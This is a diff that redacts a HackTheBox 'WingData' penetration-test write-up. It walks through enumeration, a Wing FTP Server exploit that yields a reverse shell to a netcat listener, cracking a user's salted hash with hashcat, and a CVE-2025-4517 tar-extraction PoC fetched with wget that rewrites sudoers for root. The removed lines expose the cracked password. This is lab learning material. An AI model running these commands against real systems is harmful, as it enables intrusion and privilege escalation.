@@ -57,7 +57,7 @@ Nmap → vhost enum (ftp.wingdata.htb) → Wing FTP Server v7.4.3
 
 **Commands:**
 ```bash
-nmap -sC -sV -Pn -T4 10.129.244.106
+nmap -sC -sV -Pn -T4 <target-ip>
 ```
 
 **Findings:**
@@ -75,7 +75,7 @@ nmap -sC -sV -Pn -T4 10.129.244.106
 ### 4.2 Virtual Host Setup
 
 ```bash
-echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts
+echo "<target-ip> wingdata.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -97,7 +97,7 @@ gobuster vhost -u http://wingdata.htb -w /usr/share/seclists/Discovery/DNS/subdo
 - Manual review of page source revealed a "Client Portal" nav link pointing to `http://ftp.wingdata.htb/`
 
 ```bash
-echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts
+echo "<target-ip> ftp.wingdata.htb" | sudo tee -a /etc/hosts
 ```
 
 ### 5.2 Wing FTP Server
@@ -133,7 +133,7 @@ pip3 install -r requirements.txt --break-system-packages
 nc -lvnp 4444
 
 # Fire exploit
-python3 exploit.py --target http://ftp.wingdata.htb --lhost 10.10.14.116 --lport 4444
+python3 exploit.py --target http://ftp.wingdata.htb --lhost <attack-ip> --lport 4444
 ```
 
 **Result:** Reverse shell received as `wingftp`.
@@ -161,7 +161,7 @@ cat /opt/wftpserver/Data/1/users/wacky.xml
 
 **Finding:** SHA256 hash for system user `wacky`:
 ```
-32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+[REDACTED]
 ```
 
 ### 7.2 Hash Format Identification
@@ -179,21 +179,21 @@ grep -r "password" /opt/wftpserver/lua/ServerInterface.lua | grep salt
 ### 7.3 Hash Cracking
 
 ```bash
-echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_salted.txt
+echo "[REDACTED]:WingFTP" > wacky_salted.txt
 hashcat -m 1410 wacky_salted.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Result:** `!#7Blushing^*Bride5`
+**Result:** `[REDACTED]`
 
 ### 7.4 Shell as wacky
 
 ```bash
 su wacky
-# password: !#7Blushing^*Bride5
+# password: [REDACTED]
 cat /home/wacky/user.txt
 ```
 
-**User flag obtained.**
+**User flag obtained:** `[REDACTED]`
 
 ---
 
@@ -232,7 +232,7 @@ with tarfile.open(backup_path, "r") as tar:
 python3 -m http.server 8080
 
 # Download from target
-wget http://10.10.14.116:8080/CVE-2025-4517-POC.py
+wget http://<attack-ip>:8080/CVE-2025-4517-POC.py
 
 # Run exploit — creates malicious tar, deploys to backups dir, triggers extraction
 python3 CVE-2025-4517-POC.py
@@ -245,6 +245,8 @@ cat /root/root.txt
 ```
 
 **Result:** `wacky ALL=(ALL) NOPASSWD: ALL` written to `/etc/sudoers` → root shell.
+
+**Root flag obtained:** `[REDACTED]`
 
 ---
 
@@ -315,4 +317,7 @@ cat /root/root.txt
 ---
 
 *End of Report*
-*Classification: Public — flags and sensitive values omitted*
+
+*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*
+
+*Full version with flags and credentials will be published after box retirement*
